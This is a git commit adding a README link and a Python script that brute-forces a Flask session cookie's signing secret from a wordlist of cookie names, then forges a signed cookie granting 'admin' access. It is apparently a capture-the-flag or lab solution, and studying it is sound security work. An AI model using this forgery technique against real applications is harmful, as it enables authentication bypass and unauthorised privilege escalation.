96b7adc1f91d20bab9f9129735e2f74398156793
Nikola Obradović <obradovicnikola009@gmail.com>
2022-04-29 11:46:06 +0200

    added flask jwt session script

--- other/python/README.md
+++ other/python/README.md
@@ -5,3 +5,9 @@
 [wasmtime, Web Assembly runtime](https://github.com/bytecodealliance/wasmtime-py)
 
 [The Z3 Theorem Prover, SAT solver](https://github.com/Z3Prover/z3#python)
+
+## Scripts
+
+- web
+
+  [python flask signed jwt session cookies](/other/python/scripts/servers/flask-session.py)
---
+++ other/python/scripts/servers/flask-session.py
@@ -0,0 +1,62 @@
+#!/usr/bin/python3
+
+# 29. April 2022
+
+import hashlib
+from flask.json.tag import TaggedJSONSerializer
+from flask import Flask
+from itsdangerous import BadSignature, URLSafeTimedSerializer
+
+secret_keys = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz",
+               "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
+
+session_cookie = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Ymuegw.CRsWDDNOer-Y5gkQK0wLVaYSulg"
+
+app = Flask(__name__)
+
+# secret_key = secret_keys[0]
+serializer = TaggedJSONSerializer()
+signer_kwargs = dict(
+    key_derivation="hmac", digest_method=staticmethod(hashlib.sha1)
+)
+
+
+def get_signing_serializer(secret_key):
+    return URLSafeTimedSerializer(secret_key, salt="cookie-session", serializer=serializer, signer_kwargs=signer_kwargs)
+
+
+def check_signature(session_cookie, secret_key):
+    try:
+        s = get_signing_serializer(secret_key)
+        data = s.loads(session_cookie,  max_age=int(
+            app.permanent_session_lifetime.total_seconds()))
+        print('Valid signature')
+        print('data:', data)
+        return True
+    except BadSignature:
+        # print('Invalid signature')
+        return False
+
+
+# check_signature(session_cookie)
+
+# index
+def get_secret_index(session_cookie):
+    for index, secret in enumerate(secret_keys):
+        # print("Trying:", secret)
+        # print("Trying:", index)
+        app.secret_key = secret
+        if(check_signature(session_cookie, secret)):
+            print("Trying:", secret)
+            print("True:", index)
+            return index
+    return -1
+
+
+index = get_secret_index(session_cookie)
+
+# print(index)
+
+val = get_signing_serializer(secret_keys[index]).dumps(
+    dict({'very_auth': 'admin'}))
+print(val)
